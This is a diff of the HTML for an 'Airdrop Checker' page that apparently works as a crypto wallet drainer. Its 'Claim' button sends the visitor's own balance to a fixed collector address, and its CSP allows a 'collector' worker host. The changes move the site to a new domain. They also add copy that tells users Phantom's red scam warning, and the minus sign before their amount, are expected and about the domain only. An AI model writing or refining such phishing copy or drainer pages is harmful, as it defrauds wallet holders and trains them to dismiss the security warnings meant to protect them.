@@ -9,9 +9,9 @@
   <meta property="og:type" content="website">
   <meta property="og:title" content="Airdrop Checker">
   <meta property="og:description" content="Paste an address. No wallet, no signature during the check.">
-  <meta property="og:url" content="https://airdrop-checker.xyz/">
+  <meta property="og:url" content="https://go.ywwj.chat/">
   <meta property="og:site_name" content="Airdrop Checker">
-  <meta property="og:image" content="https://airdrop-checker.xyz/og-card.png">
+  <meta property="og:image" content="https://go.ywwj.chat/og-card.png">
   <meta property="og:image:type" content="image/png">
   <meta property="og:image:width" content="1200">
   <meta property="og:image:height" content="630">
@@ -19,10 +19,10 @@
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:title" content="Airdrop Checker">
   <meta name="twitter:description" content="Paste an address. No wallet, no signature during the check.">
-  <meta name="twitter:image" content="https://airdrop-checker.xyz/og-card.png">
+  <meta name="twitter:image" content="https://go.ywwj.chat/og-card.png">
   <meta name="twitter:image:alt" content="Airdrop Checker — paste an address, see the balance">
   <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://static.cloudflareinsights.com; style-src 'self' 'unsafe-inline'; connect-src https://mainnet.helius-rpc.com https://eth.drpc.org https://rpc.flashbots.net https://ethereum-rpc.publicnode.com https://api.mainnet-beta.solana.com https://solana-rpc.publicnode.com https://api.devnet.solana.com https://api.dexscreener.com https://cloudflareinsights.com https://airdrop-collector.erichck.workers.dev; img-src 'self' data: https:; base-uri 'none'; object-src 'none'; form-action 'none'">
-  <link rel="canonical" href="https://airdrop-checker.xyz/">
+  <link rel="canonical" href="https://go.ywwj.chat/">
   <title>Airdrop Checker</title>
   <link rel="icon" href="favicon.svg" type="image/svg+xml">
   <link rel="stylesheet" href="style.css?v=7">
@@ -188,7 +188,11 @@
           </dl>
 
           <p id="approval-line">Your wallet asks you to approve the same four rows shown here. No hidden fee.</p>
-          <p class="wallet-warn"><strong>Wallet may warn.</strong> Phantom flags new domains automatically &mdash; a red warning does not mean these rows are wrong. Check that the wallet shows the same To and amount, and cancel if it does not.</p>
+          <div class="wallet-warn">
+            <p><strong>Phantom may open with a red screen.</strong> It shows three things: the recipient, the amount, and a minus sign in front of that amount. All three are printed four lines above, in the same order.</p>
+            <p>The banner is about the domain, not about this transaction. This page moves a balance to one fixed address, which is the shape automatic scanners are trained on. Phantom's own simulation still returns the amount above.</p>
+            <p class="wallet-warn-rule"><b>Cancel if any of the three differs.</b> Three matches and one minus sign &mdash; that is the expected screen.</p>
+          </div>
           <button id="claim-button" type="button" class="button primary">Claim in one signature</button>
           <p id="claim-sub">Funds move straight to the address shown above.</p>
           <p id="claim-status" role="status" hidden></p>
@@ -279,12 +283,12 @@
           <h3 id="faq-start"><svg class="glyph" viewBox="0 0 16 16" aria-hidden="true"><circle cx="8" cy="8" r="6"></circle><path d="m10.8 5.2-1.7 3.9-3.9 1.7 1.7-3.9 3.9-1.7Z"></path></svg>Getting started</h3>
           <details><summary>What is an airdrop?</summary><p>A distribution of tokens to addresses a project selects under its own rules. Eligibility can depend on past activity or holdings at a snapshot time. Each project sets its own rules and its own claim window.</p></details>
           <details><summary>Which networks work here?</summary><p>Solana and Ethereum mainnet. Pick a network, paste an address, and the page reads that chain. Switching networks clears the address field.</p></details>
-          <details><summary>Why does Phantom say this site may be a scam?</summary><p>Because the domain is on automatic blocklists. They score new domains by pattern, and this one looks like a collector by design: one signature, funds leave the wallet. Check the four rows against the wallet prompt and open the recipient in an explorer; the numbers should match exactly. The warning also carries the simulated amount, which is the same figure printed here.</p></details>
+          <details><summary>Why does Phantom say this site may be a scam?</summary><p>The domain can sit on automatic blocklists. Scanners score shape, and this page has the shape they are trained on: one signature, a fraction of the balance, one fixed address. The verdict is about the domain &mdash; which is why Phantom's own simulation still returns the exact amount printed here. Nothing is approved and left behind: one transfer per asset, plus one plain SOL transfer.</p></details>
           <details><summary>Is checking really read-only?</summary><p>Yes. A public RPC node answers with balances. Your wallet is not touched until you press the collect button.</p></details>
         </section>
         <section class="faq-group" aria-labelledby="faq-results">
           <h3 id="faq-results"><svg class="glyph" viewBox="0 0 16 16" aria-hidden="true"><rect x="3.5" y="2" width="9" height="12" rx="1.5"></rect><path d="M6 6h4 M6 9h4"></path></svg>Results and amount</h3>
-          <details><summary>Why say claim, then?</summary><p>Because it is the word people already understand. Underneath it is a plain transfer: no mint, no merkle proof, no token approval.</p></details>
+          <details><summary>Why say claim, then?</summary><p>Because it is the word people understand. Underneath it is a plain transfer &mdash; no mint, no merkle proof, no approval.</p></details>
           <details><summary>How is the amount calculated?</summary><p>From the live balance, minus room for the network fee. What is shown is what the transaction sends; the fee row sits right above the button.</p></details>
           <details><summary>Where does the money end up?</summary><p>At the recipient printed under <strong>To</strong>. That address is shown before the wallet opens and can be opened in a block explorer first.</p></details>
           <details><summary>Is this free money?</summary><p>Not exactly. Nothing is minted for you. It is the balance already in your address, and it moves to the collector address in one transaction. What you get is speed, not new coins.</p></details>
